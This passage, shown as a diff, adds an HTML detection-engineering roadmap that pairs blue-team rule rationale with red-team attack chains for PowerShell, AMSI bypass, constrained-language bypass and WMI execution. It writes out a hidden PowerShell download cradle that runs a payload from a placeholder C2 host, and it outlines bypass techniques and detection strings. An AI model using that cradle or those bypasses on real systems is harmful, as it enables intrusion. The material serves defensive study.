@@ -1,0 +1,2175 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTDF — God Mode Composite Roadmap</title>
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+:root {
+  --bg-primary: #050508;
+  --bg-secondary: #0a0a0f;
+  --bg-card: #0d0d14;
+  --bg-card-hover: #12121c;
+  --border-dim: #1a1a2e;
+  --border-mid: #252540;
+
+  /* Blue Team */
+  --blue-primary: #00aaff;
+  --blue-secondary: #0066cc;
+  --blue-glow: rgba(0,170,255,0.15);
+  --blue-dim: rgba(0,170,255,0.06);
+  --blue-text: #7dd3fc;
+  --blue-header: #0a1628;
+  --blue-border: rgba(0,170,255,0.3);
+
+  /* Red Team */
+  --red-primary: #ff2244;
+  --red-secondary: #cc0022;
+  --red-glow: rgba(255,34,68,0.15);
+  --red-dim: rgba(255,34,68,0.06);
+  --red-text: #fca5a5;
+  --red-header: #1a0a0e;
+  --red-border: rgba(255,34,68,0.3);
+
+  /* Neutral */
+  --gold: #f59e0b;
+  --gold-dim: rgba(245,158,11,0.1);
+  --green: #00ff88;
+  --green-dim: rgba(0,255,136,0.08);
+  --text-primary: #e2e8f0;
+  --text-secondary: #94a3b8;
+  --text-dim: #475569;
+
+  --font-mono: 'Share Tech Mono', monospace;
+  --font-display: 'Orbitron', sans-serif;
+  --font-body: 'Rajdhani', sans-serif;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg-primary);
+  color: var(--text-primary);
+  font-family: var(--font-body);
+  font-size: 16px;
+  line-height: 1.6;
+  overflow-x: hidden;
+}
+
+/* SCANLINE OVERLAY */
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.03) 2px, rgba(0,0,0,0.03) 4px);
+  pointer-events: none;
+  z-index: 9999;
+}
+
+/* HEADER */
+.site-header {
+  background: linear-gradient(180deg, #080810 0%, var(--bg-primary) 100%);
+  border-bottom: 1px solid var(--border-mid);
+  padding: 48px 40px 36px;
+  position: relative;
+  overflow: hidden;
+}
+
+.site-header::before {
+  content: '';
+  position: absolute;
+  top: 0; left: 0; right: 0;
+  height: 2px;
+  background: linear-gradient(90deg, var(--red-primary), var(--blue-primary), var(--red-primary));
+  animation: scanline 3s linear infinite;
+}
+
+@keyframes scanline {
+  0% { background-position: -200% 0; }
+  100% { background-position: 200% 0; }
+}
+
+.header-grid {
+  display: grid;
+  grid-template-columns: 1fr auto;
+  gap: 24px;
+  align-items: end;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+
+.header-title {
+  font-family: var(--font-display);
+  font-size: clamp(18px, 3vw, 32px);
+  font-weight: 900;
+  letter-spacing: 0.08em;
+  line-height: 1.2;
+}
+
+.title-red { color: var(--red-primary); }
+.title-blue { color: var(--blue-primary); }
+.title-white { color: var(--text-primary); }
+
+.header-sub {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-dim);
+  letter-spacing: 0.15em;
+  margin-top: 8px;
+}
+
+.header-meta {
+  text-align: right;
+}
+
+.meta-badge {
+  display: inline-block;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  padding: 4px 10px;
+  border-radius: 2px;
+  letter-spacing: 0.1em;
+  margin-bottom: 4px;
+}
+
+.badge-red { background: var(--red-dim); border: 1px solid var(--red-border); color: var(--red-text); }
+.badge-blue { background: var(--blue-dim); border: 1px solid var(--blue-border); color: var(--blue-text); }
+.badge-gold { background: var(--gold-dim); border: 1px solid rgba(245,158,11,0.3); color: var(--gold); }
+
+/* LEGEND */
+.legend-bar {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 20px 40px;
+  display: flex;
+  gap: 32px;
+  align-items: center;
+  border-bottom: 1px solid var(--border-dim);
+  flex-wrap: wrap;
+}
+
+.legend-item {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-secondary);
+}
+
+.legend-dot {
+  width: 10px; height: 10px;
+  border-radius: 50%;
+}
+
+.dot-blue { background: var(--blue-primary); box-shadow: 0 0 6px var(--blue-primary); }
+.dot-red { background: var(--red-primary); box-shadow: 0 0 6px var(--red-primary); }
+.dot-gold { background: var(--gold); box-shadow: 0 0 6px var(--gold); }
+.dot-green { background: var(--green); box-shadow: 0 0 6px var(--green); }
+
+/* NAV TABS */
+.nav-tabs {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 24px 40px 0;
+  display: flex;
+  gap: 4px;
+  flex-wrap: wrap;
+  border-bottom: 1px solid var(--border-mid);
+}
+
+.nav-tab {
+  font-family: var(--font-mono);
+  font-size: 11px;
+  letter-spacing: 0.1em;
+  padding: 8px 16px;
+  border: 1px solid var(--border-dim);
+  border-bottom: none;
+  background: var(--bg-secondary);
+  color: var(--text-dim);
+  cursor: pointer;
+  transition: all 0.2s;
+  border-radius: 3px 3px 0 0;
+  text-transform: uppercase;
+}
+
+.nav-tab:hover { color: var(--text-secondary); border-color: var(--border-mid); }
+.nav-tab.active-blue { background: var(--blue-header); color: var(--blue-primary); border-color: var(--blue-border); }
+.nav-tab.active-red { background: var(--red-header); color: var(--red-primary); border-color: var(--red-border); }
+.nav-tab.active-gold { background: var(--gold-dim); color: var(--gold); border-color: rgba(245,158,11,0.3); }
+
+/* MAIN CONTENT */
+.main {
+  max-width: 1400px;
+  margin: 0 auto;
+  padding: 40px;
+}
+
+.tab-content { display: none; }
+.tab-content.active { display: block; }
+
+/* ECOSYSTEM BLOCK */
+.ecosystem {
+  margin-bottom: 60px;
+  border: 1px solid var(--border-dim);
+  border-radius: 4px;
+  overflow: hidden;
+  transition: border-color 0.3s;
+}
+
+.ecosystem:hover { border-color: var(--border-mid); }
+
+.ecosystem-header {
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  gap: 20px;
+  align-items: center;
+  padding: 20px 24px;
+  background: linear-gradient(135deg, #0a0a12 0%, #0d0d18 100%);
+  border-bottom: 1px solid var(--border-mid);
+  cursor: pointer;
+}
+
+.eco-id {
+  font-family: var(--font-display);
+  font-size: 11px;
+  font-weight: 700;
+  color: var(--gold);
+  letter-spacing: 0.15em;
+  background: var(--gold-dim);
+  border: 1px solid rgba(245,158,11,0.2);
+  padding: 4px 10px;
+  border-radius: 2px;
+}
+
+.eco-title {
+  font-family: var(--font-display);
+  font-size: 15px;
+  font-weight: 700;
+  color: var(--text-primary);
+  letter-spacing: 0.06em;
+}
+
+.eco-tactic {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--text-dim);
+  letter-spacing: 0.1em;
+}
+
+.eco-toggle {
+  font-family: var(--font-mono);
+  font-size: 18px;
+  color: var(--text-dim);
+  transition: transform 0.3s;
+  user-select: none;
+}
+
+.ecosystem.open .eco-toggle { transform: rotate(180deg); }
+
+.ecosystem-body { display: none; padding: 0; }
+.ecosystem.open .ecosystem-body { display: block; }
+
+/* CORE COMPOSITE */
+.core-composite {
+  background: linear-gradient(135deg, var(--blue-header) 0%, #0a0f1a 100%);
+  border-bottom: 1px solid var(--blue-border);
+  padding: 24px;
+}
+
+.core-label {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 0.2em;
+  color: var(--blue-primary);
+  text-transform: uppercase;
+  margin-bottom: 12px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.core-label::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--blue-border);
+}
+
+.core-rule-name {
+  font-family: var(--font-display);
+  font-size: 17px;
+  font-weight: 700;
+  color: var(--blue-primary);
+  margin-bottom: 8px;
+  letter-spacing: 0.05em;
+}
+
+.core-rule-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-dim);
+  text-decoration: none;
+  border: 1px dashed var(--border-mid);
+  padding: 3px 10px;
+  border-radius: 2px;
+  margin-bottom: 16px;
+  transition: all 0.2s;
+}
+
+.core-rule-link:hover { color: var(--blue-primary); border-color: var(--blue-border); }
+
+.two-col {
+  display: grid;
+  grid-template-columns: 1fr 1fr;
+  gap: 16px;
+}
+
+@media (max-width: 900px) { .two-col { grid-template-columns: 1fr; } }
+
+.panel-blue {
+  background: var(--blue-dim);
+  border: 1px solid var(--blue-border);
+  border-radius: 3px;
+  padding: 16px;
+}
+
+.panel-red {
+  background: var(--red-dim);
+  border: 1px solid var(--red-border);
+  border-radius: 3px;
+  padding: 16px;
+}
+
+.panel-label {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  margin-bottom: 10px;
+  display: flex;
+  align-items: center;
+  gap: 6px;
+}
+
+.lbl-blue { color: var(--blue-primary); }
+.lbl-red { color: var(--red-primary); }
+
+.panel-text {
+  font-family: var(--font-body);
+  font-size: 14px;
+  color: var(--text-secondary);
+  line-height: 1.7;
+}
+
+.panel-text strong { color: var(--text-primary); font-weight: 600; }
+
+/* COUSIN RULES */
+.cousin-section {
+  padding: 20px 24px;
+  background: var(--bg-card);
+}
+
+.cousin-section-label {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 0.2em;
+  color: var(--text-dim);
+  text-transform: uppercase;
+  margin-bottom: 16px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+
+.cousin-section-label::after {
+  content: '';
+  flex: 1;
+  height: 1px;
+  background: var(--border-dim);
+}
+
+.cousin-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
+  gap: 12px;
+}
+
+/* COUSIN CARD */
+.cousin-card {
+  background: var(--bg-secondary);
+  border: 1px solid var(--border-dim);
+  border-radius: 3px;
+  overflow: hidden;
+  transition: all 0.25s;
+}
+
+.cousin-card:hover {
+  border-color: var(--red-border);
+  box-shadow: 0 0 20px rgba(255,34,68,0.08);
+  transform: translateY(-1px);
+}
+
+.cousin-card-header {
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  gap: 10px;
+  align-items: center;
+  padding: 12px 14px;
+  background: linear-gradient(135deg, var(--red-header) 0%, #0f0a0c 100%);
+  border-bottom: 1px solid var(--red-border);
+  cursor: pointer;
+}
+
+.cousin-icon {
+  width: 28px; height: 28px;
+  background: var(--red-dim);
+  border: 1px solid var(--red-border);
+  border-radius: 3px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+  flex-shrink: 0;
+}
+
+.cousin-name {
+  font-family: var(--font-body);
+  font-size: 13px;
+  font-weight: 600;
+  color: var(--red-text);
+  letter-spacing: 0.03em;
+  line-height: 1.3;
+}
+
+.cousin-ttp {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  color: var(--red-primary);
+  background: var(--red-dim);
+  border: 1px solid var(--red-border);
+  padding: 2px 6px;
+  border-radius: 2px;
+  white-space: nowrap;
+}
+
+.cousin-toggle {
+  font-size: 10px;
+  color: var(--text-dim);
+  margin-left: 6px;
+  transition: transform 0.2s;
+  cursor: pointer;
+}
+
+.cousin-card.open .cousin-toggle { transform: rotate(180deg); }
+
+.cousin-body {
+  display: none;
+  padding: 14px;
+}
+
+.cousin-card.open .cousin-body { display: block; }
+
+.cousin-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--text-dim);
+  text-decoration: none;
+  border: 1px dashed var(--border-mid);
+  padding: 3px 10px;
+  border-radius: 2px;
+  margin-bottom: 12px;
+  transition: all 0.2s;
+}
+
+.cousin-link:hover { color: var(--red-primary); border-color: var(--red-border); }
+
+.attack-section {
+  margin-bottom: 12px;
+}
+
+.attack-section-title {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  margin-bottom: 6px;
+  padding: 4px 8px;
+  border-radius: 2px;
+}
+
+.ast-blue { color: var(--blue-primary); background: var(--blue-dim); border-left: 2px solid var(--blue-primary); }
+.ast-red { color: var(--red-primary); background: var(--red-dim); border-left: 2px solid var(--red-primary); }
+
+.attack-text {
+  font-family: var(--font-body);
+  font-size: 13px;
+  color: var(--text-secondary);
+  line-height: 1.65;
+  padding: 0 4px;
+}
+
+.attack-text strong { color: var(--text-primary); font-weight: 600; }
+.attack-text .red-em { color: var(--red-text); font-weight: 600; }
+.attack-text .blue-em { color: var(--blue-text); font-weight: 600; }
+
+.malware-tags {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 4px;
+  margin-top: 8px;
+}
+
+.malware-tag {
+  font-family: var(--font-mono);
+  font-size: 9px;
+  padding: 2px 7px;
+  border-radius: 2px;
+  letter-spacing: 0.05em;
+}
+
+.tag-red { background: var(--red-dim); border: 1px solid var(--red-border); color: var(--red-text); }
+.tag-blue { background: var(--blue-dim); border: 1px solid var(--blue-border); color: var(--blue-text); }
+.tag-gold { background: var(--gold-dim); border: 1px solid rgba(245,158,11,0.2); color: var(--gold); }
+
+/* KILL CHAIN BADGE */
+.killchain-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 4px;
+  font-family: var(--font-mono);
+  font-size: 9px;
+  padding: 3px 8px;
+  background: rgba(0,255,136,0.06);
+  border: 1px solid rgba(0,255,136,0.2);
+  color: var(--green);
+  border-radius: 2px;
+  margin-bottom: 8px;
+}
+
+/* NOVEL RESEARCH SECTION */
+.novel-card {
+  background: var(--bg-card);
+  border: 1px solid rgba(245,158,11,0.2);
+  border-radius: 4px;
+  margin-bottom: 32px;
+  overflow: hidden;
+}
+
+.novel-header {
+  background: linear-gradient(135deg, #1a1000 0%, #120d00 100%);
+  border-bottom: 1px solid rgba(245,158,11,0.3);
+  padding: 20px 24px;
+  cursor: pointer;
+  display: grid;
+  grid-template-columns: auto 1fr auto;
+  gap: 16px;
+  align-items: center;
+}
+
+.novel-badge {
+  font-family: var(--font-display);
+  font-size: 9px;
+  font-weight: 700;
+  padding: 4px 10px;
+  background: var(--gold-dim);
+  border: 1px solid rgba(245,158,11,0.3);
+  color: var(--gold);
+  letter-spacing: 0.15em;
+  border-radius: 2px;
+}
+
+.novel-title {
+  font-family: var(--font-display);
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--gold);
+  letter-spacing: 0.05em;
+}
+
+.novel-body { display: none; padding: 24px; }
+.novel-card.open .novel-body { display: block; }
+
+/* FOOTER */
+.site-footer {
+  border-top: 1px solid var(--border-dim);
+  padding: 32px 40px;
+  text-align: center;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--text-dim);
+  letter-spacing: 0.1em;
+  max-width: 1400px;
+  margin: 0 auto;
+}
+
+/* UTILITY */
+.divider {
+  height: 1px;
+  background: linear-gradient(90deg, transparent, var(--border-mid), transparent);
+  margin: 16px 0;
+}
+
+.note-box {
+  background: rgba(245,158,11,0.04);
+  border: 1px solid rgba(245,158,11,0.15);
+  border-radius: 3px;
+  padding: 12px 16px;
+  font-family: var(--font-mono);
+  font-size: 11px;
+  color: var(--gold);
+  margin-bottom: 24px;
+  letter-spacing: 0.05em;
+}
+
+/* INTRO STATS */
+.stats-row {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+  gap: 12px;
+  margin-bottom: 40px;
+}
+
+.stat-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border-dim);
+  border-radius: 3px;
+  padding: 16px;
+  text-align: center;
+}
+
+.stat-number {
+  font-family: var(--font-display);
+  font-size: 28px;
+  font-weight: 900;
+  line-height: 1;
+  margin-bottom: 4px;
+}
+
+.stat-label {
+  font-family: var(--font-mono);
+  font-size: 10px;
+  color: var(--text-dim);
+  letter-spacing: 0.1em;
+  text-transform: uppercase;
+}
+
+.sn-blue { color: var(--blue-primary); }
+.sn-red { color: var(--red-primary); }
+.sn-gold { color: var(--gold); }
+.sn-green { color: var(--green); }
+</style>
+</head>
+<body>
+
+<header class="site-header">
+  <div class="header-grid">
+    <div>
+      <div class="header-title">
+        <span class="title-red">MINIMUM TRUTH</span>
+        <span class="title-white"> DETECTION FRAMEWORK</span><br>
+        <span class="title-blue">GOD MODE</span>
+        <span class="title-white"> COMPOSITE ROADMAP</span>
+      </div>
+      <div class="header-sub">ALA DABAT · GITHUB.COM/AZDABAT · ADVERSARY-INFORMED DETECTION ENGINEERING · ALL ATT&CK ECOSYSTEMS</div>
+    </div>
+    <div class="header-meta">
+      <div><span class="meta-badge badge-red">RED TEAM BREAKDOWNS</span></div>
+      <div><span class="meta-badge badge-blue">BLUE TEAM COMPOSITES</span></div>
+      <div><span class="meta-badge badge-gold">NOVEL RESEARCH</span></div>
+    </div>
+  </div>
+</header>
+
+<div class="legend-bar">
+  <div class="legend-item"><div class="legend-dot dot-blue"></div> BLUE TEAM — Detection logic, why the rule is shaped this way</div>
+  <div class="legend-item"><div class="legend-dot dot-red"></div> RED TEAM — Hacker methodology, tools, malware families, kill chain position</div>
+  <div class="legend-item"><div class="legend-dot dot-gold"></div> NOVEL — Original MTDF research (EtherRAT, SilverFox, Stego)</div>
+  <div class="legend-item"><div class="legend-dot dot-green"></div> KILL CHAIN — ATT&CK phase mapping</div>
+</div>
+
+<div class="nav-tabs">
+  <div class="nav-tab active-blue" onclick="switchTab('execution')">Execution</div>
+  <div class="nav-tab" onclick="switchTab('persistence')">Persistence</div>
+  <div class="nav-tab" onclick="switchTab('privilege')">Privilege Escalation</div>
+  <div class="nav-tab" onclick="switchTab('defense')">Defense Evasion</div>
+  <div class="nav-tab" onclick="switchTab('credential')">Credential Access</div>
+  <div class="nav-tab" onclick="switchTab('discovery')">Discovery</div>
+  <div class="nav-tab" onclick="switchTab('lateral')">Lateral Movement</div>
+  <div class="nav-tab" onclick="switchTab('collection')">Collection</div>
+  <div class="nav-tab" onclick="switchTab('c2')">C2</div>
+  <div class="nav-tab" onclick="switchTab('exfil')">Exfiltration</div>
+  <div class="nav-tab" onclick="switchTab('impact')">Impact</div>
+  <div class="nav-tab active-gold" onclick="switchTab('novel')">★ Novel Research</div>
+</div>
+
+<div class="main">
+
+<!-- ============================================================ -->
+<!-- TAB: EXECUTION -->
+<!-- ============================================================ -->
+<div id="tab-execution" class="tab-content active">
+
+  <div class="note-box">⚡ EXECUTION ECOSYSTEM — The moment code runs on a host. The most telemetry-rich tactic in the kill chain. Minimum truth: something must execute. Every cousin surfaces a structurally distinct execution primitive.</div>
+
+  <div class="stats-row">
+    <div class="stat-card"><div class="stat-number sn-blue">8</div><div class="stat-label">Core Composites</div></div>
+    <div class="stat-card"><div class="stat-number sn-red">24+</div><div class="stat-label">Cousin Rules</div></div>
+    <div class="stat-card"><div class="stat-number sn-gold">T1059</div><div class="stat-label">Primary TTP</div></div>
+    <div class="stat-card"><div class="stat-number sn-green">HIGH</div><div class="stat-label">Detection Yield</div></div>
+  </div>
+
+  <!-- ECOSYSTEM: PowerShell -->
+  <div class="ecosystem" id="eco-ps">
+    <div class="ecosystem-header" onclick="toggleEco('eco-ps')">
+      <div class="eco-id">T1059.001</div>
+      <div>
+        <div class="eco-title">PowerShell Execution Engine</div>
+        <div class="eco-tactic">EXECUTION · COMMAND AND SCRIPTING INTERPRETER</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">PowerShell Intent-First Composite — Encoded/Obfuscated Execution Anchor</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM — Why this composite exists</div>
+            <div class="panel-text">
+              PowerShell is the attacker's native tongue on Windows. The minimum truth anchor is <strong>intent-first</strong>: encoded or obfuscated parameters are structurally anomalous regardless of payload content. A legitimate administrator does not base64-encode routine scripts.<br><br>
+              The composite anchors on <code>-EncodedCommand</code>, <code>-enc</code>, <code>-e</code> flags combined with parent process context (Office apps, WMI, scheduled tasks spawning PowerShell). <strong>Reinforcement signals</strong>: network connections immediately post-execution, AMSI bypass strings, download cradles (IEX, Invoke-Expression, Net.WebClient). Cumulative scoring prevents single-signal noise triggering while ensuring chains are caught.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM — How attackers deploy this</div>
+            <div class="panel-text">
+              PowerShell is the <red-em>entry point of choice</red-em> for commodity and APT actors alike because it's signed, trusted, and provides direct .NET access. The kill chain position is typically <strong>Initial Access → Execution</strong> via phishing macro or <strong>Post-Exploitation</strong> via lateral movement.<br><br>
+              <strong>Real-world chain:</strong> Phishing email → malicious Office macro → <code>powershell.exe -enc [base64 payload]</code> → download cradle pulls stageless Cobalt Strike beacon from C2 → in-memory reflective injection. No file ever touches disk.<br><br>
+              Encoding is used because: (1) bypasses naive string-matching AV, (2) obscures C2 URLs from proxy logs, (3) evades email gateway inspection.
+              <div class="malware-tags">
+                <span class="malware-tag tag-red">Cobalt Strike</span>
+                <span class="malware-tag tag-red">Empire</span>
+                <span class="malware-tag tag-red">PowerSploit</span>
+                <span class="malware-tag tag-red">Nishang</span>
+                <span class="malware-tag tag-gold">APT29</span>
+                <span class="malware-tag tag-gold">FIN7</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <div class="cousin-section">
+        <div class="cousin-section-label">🔴 COUSIN COMPOSITE RULES — Click to expand red team breakdown</div>
+        <div class="cousin-grid">
+
+          <div class="cousin-card" id="cc-ps-1">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-ps-1')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">PowerShell Download Cradle Detection</div>
+                <div class="cousin-ttp">T1059.001 · T1105</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Execution → C2 → Ingress Tool Transfer</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM — Detection rationale</div>
+                <div class="attack-text">Cousin to the encoding anchor. Targets <strong>IEX (New-Object Net.WebClient).DownloadString</strong> and <code>Invoke-WebRequest</code> cradles. These are the delivery mechanism for stageless payloads. The minimum truth here is a PowerShell process initiating an outbound HTTP/HTTPS connection to a non-corporate domain immediately after spawn. Reinforcement: process spawn anomaly (Office parent), domain age &lt;30 days, JA3 hash anomaly.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM — When, why and how</div>
+                <div class="attack-text">
+                  <strong>When deployed:</strong> Stage 2 of execution chain after initial foothold. The attacker has code running but needs their full toolkit.<br><br>
+                  <strong>Why this technique:</strong> Living off the land — PowerShell's <code>Net.WebClient</code> is a signed Microsoft class. No additional tools needed. The payload never touches disk; it executes entirely in memory via <code>IEX</code>.<br><br>
+                  <strong>Full attacker chain:</strong><br>
+                  1. Macro drops a one-liner: <code>powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://[C2]/payload.ps1')"</code><br>
+                  2. Payload pulls Cobalt Strike shellcode, injects into <code>notepad.exe</code> via <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code><br>
+                  3. Beacon establishes HTTPS C2 — appears as normal browser traffic
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Cobalt Strike Beacon</span>
+                    <span class="malware-tag tag-red">Metasploit</span>
+                    <span class="malware-tag tag-red">PowerSploit</span>
+                    <span class="malware-tag tag-gold">Lazarus Group</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-ps-2">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-ps-2')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">AMSI Bypass Detection</div>
+                <div class="cousin-ttp">T1562.001 · T1059.001</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Defense Evasion → Execution</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM — Detection rationale</div>
+                <div class="attack-text">AMSI (Antimalware Scan Interface) is the hook Windows uses to pass script content to AV engines. Bypassing it is a prerequisite for any sophisticated in-memory PowerShell attack. Minimum truth: any PowerShell process writing to <code>amsi.dll</code> memory space, or Script Block Logging capturing known bypass strings (<code>AmsiUtils</code>, <code>amsiInitFailed</code>, reflection-based patching). This cousin catches the prerequisite, not just the payload — structurally upstream of the actual malicious execution.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM — When, why and how</div>
+                <div class="attack-text">
+                  <strong>Why attackers bypass AMSI:</strong> Without bypassing AMSI, Empire, PowerSploit, and Cobalt Strike PS payloads get caught by Windows Defender immediately on execution — even if the script is in memory.<br><br>
+                  <strong>Standard bypass technique:</strong> Reflection patching — using .NET reflection to locate <code>AmsiScanBuffer</code> in memory and patch it to always return <code>AMSI_RESULT_CLEAN</code>. Executes in ~3 lines of PowerShell.<br><br>
+                  <strong>Kill chain position:</strong> Always executed BEFORE the actual payload — it's the unlocking step that enables everything else. If you catch the bypass, you catch the attacker preparing, not just acting.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">Empire</span>
+                    <span class="malware-tag tag-red">Invoke-Obfuscation</span>
+                    <span class="malware-tag tag-red">AMSITrigger</span>
+                    <span class="malware-tag tag-gold">FIN7</span>
+                    <span class="malware-tag tag-gold">APT41</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+          <div class="cousin-card" id="cc-ps-3">
+            <div class="cousin-card-header" onclick="toggleCousin('cc-ps-3')">
+              <div class="cousin-icon">🔴</div>
+              <div>
+                <div class="cousin-name">PowerShell Constrained Language Mode Bypass</div>
+                <div class="cousin-ttp">T1059.001 · T1562</div>
+              </div>
+              <div class="cousin-toggle">▼</div>
+            </div>
+            <div class="cousin-body">
+              <a href="#" class="cousin-link">📎 INSERT RULE LINK</a>
+              <div class="killchain-badge">⚡ KILL CHAIN: Defense Evasion → Execution</div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-blue">🔵 BLUE TEAM — Detection rationale</div>
+                <div class="attack-text">Constrained Language Mode (CLM) restricts PowerShell to safe operations — blocking .NET type access, COM objects, and many execution primitives. Detecting bypass attempts catches attackers trying to downgrade to an unrestricted execution environment. Monitor for <code>__PSLockdownPolicy</code> environment variable manipulation, <code>powershell_ise.exe</code> spawning, and WDAC policy tampering.</div>
+              </div>
+              <div class="attack-section">
+                <div class="attack-section-title ast-red">🔴 RED TEAM — When, why and how</div>
+                <div class="attack-text">
+                  <strong>The problem attackers face:</strong> Enterprise environments increasingly enforce CLM via AppLocker or WDAC. This blocks most PowerShell offensive toolkits.<br><br>
+                  <strong>Bypass chain:</strong> Attackers find a COM object or trusted binary that invokes PowerShell in FullLanguage mode, or exploit the <code>__PSLockdownPolicy</code> environment variable (can be set per-process). MSBuild.exe and InstallUtil.exe are classic trusted-binary bypasses that invoke .NET directly, sidestepping CLM entirely.
+                  <div class="malware-tags">
+                    <span class="malware-tag tag-red">MSBuild bypass</span>
+                    <span class="malware-tag tag-red">InstallUtil</span>
+                    <span class="malware-tag tag-red">PowerSharpPack</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ECOSYSTEM: WMI -->
+  <div class="ecosystem" id="eco-wmi">
+    <div class="ecosystem-header" onclick="toggleEco('eco-wmi')">
+      <div class="eco-id">T1047</div>
+      <div>
+        <div class="eco-title">WMI Fileless Execution Engine</div>
+        <div class="eco-tactic">EXECUTION · SUBSTRATE-FIRST DETECTION</div>
+      </div>
+      <div class="eco-toggle">▼</div>
+    </div>
+    <div class="ecosystem-body">
+      <div class="core-composite">
+        <div class="core-label">🔵 CORE BASELINE COMPOSITE</div>
+        <div class="core-rule-name">WMI Process Spawn Substrate Anchor — Provider Host Anomaly</div>
+        <a href="#" class="core-rule-link">📎 INSERT RULE LINK · KQL composite · Sentinel + MDE</a>
+        <div class="two-col">
+          <div class="panel-blue">
+            <div class="panel-label lbl-blue">🔵 BLUE TEAM — Why substrate-first matters here</div>
+            <div class="panel-text">
+              WMI is the quintessential substrate-first detection problem. No command line is visible — <code>WmiPrvSE.exe</code> spawns child processes that appear to have no parent relationship to the attacker's tool. The minimum truth is <strong>WmiPrvSE.exe spawning any interactive process</strong>: cmd.exe, powershell.exe, cscript.exe, or any executable outside system32 with no legitimate administrative justification.<br><br>
+              Reinforcement: WMI subscription creation events (FilterToConsumerBinding), network connections from WmiPrvSE, process injection into WmiPrvSE. The 30-day atomic primitive index catches staged WMI subscriptions that fire days after creation — defeating temporal deception by tracking the subscription create event independently of the execution event.
+            </div>
+          </div>
+          <div class="panel-red">
+            <div class="panel-label lbl-red">🔴 RED TEAM — Why WMI is a favourite</div>
+            <div class="panel-text">
+              WMI is the attacker's <strong>fileless persistence and execution holy grail</strong>. It's a signed Windows component, runs as SYSTEM, and historically generated almost no detectable telemetry.<br><br>
+              <strong>Attack chain (APT-style):</strong><br>
+              1. Initial foothold established via phishing/exploit<br>
+              2. Attacker creates WMI Event Filter (trigger: system uptime &gt; 5 min)<br>
+              3. Attacker creates WMI Event Consumer (action: execute PowerShell download cradle)<br>
